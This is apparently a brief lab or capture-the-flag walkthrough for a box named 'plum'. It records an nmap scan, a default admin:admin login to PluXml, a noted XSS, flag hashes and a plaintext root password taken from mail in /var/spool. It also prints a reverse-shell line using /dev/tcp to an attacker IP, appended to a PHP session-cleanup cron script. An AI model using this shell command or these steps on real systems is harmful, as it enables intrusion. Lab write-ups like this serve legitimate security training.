# Linux - plum

---

### Host

```bash
192.168.136.28
```

### Scan

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 00:58 EST
Nmap scan report for 192.168.136.28
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)

80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: PluXml - Blog or CMS, XML powered !
|_http-server-header: Apache/2.4.56 (Debian)

Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   32.16 ms 192.168.45.1
2   32.13 ms 192.168.45.254
3   28.13 ms 192.168.251.1
4   28.23 ms 192.168.136.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.21 seconds
```

---

## Walkthrough

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%201.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%202.png)

- default password - admin : admin

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%203.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%204.png)

- xss found
- static1 page - test php

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%205.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%206.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%207.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%208.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%209.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2010.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2011.png)

c2da830b2bd6be7b3b3a9d228b62b617

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2012.png)

```bash
#!/bin/sh -e
#
# sessionclean - a script to cleanup stale PHP sessions
#
# Copyright 2013-2015 Ondřej Surý <ondrej@sury.org>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy of
# this software and associated documentation files (the "Software"), to deal in
# the Software without restriction, including without limitation the rights to
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
# the Software, and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

echo "sh -i >& /dev/tcp/192.168.45.170/9091 0>&1" >> session
```

- can’t write into the file. discover another way.
- find an open port 25 → SMTP → check /var/spool. check information stored in /var.

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2013.png)

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2014.png)

- root : 6s8kaZZNaZZYBMfh2YEW

![image.png](Linux%20-%20plum%20180553bebf0f809eab7efadeb1a6b3a4/image%2015.png)

e0fffbc4c4d79f6a5e0ee607d70f1132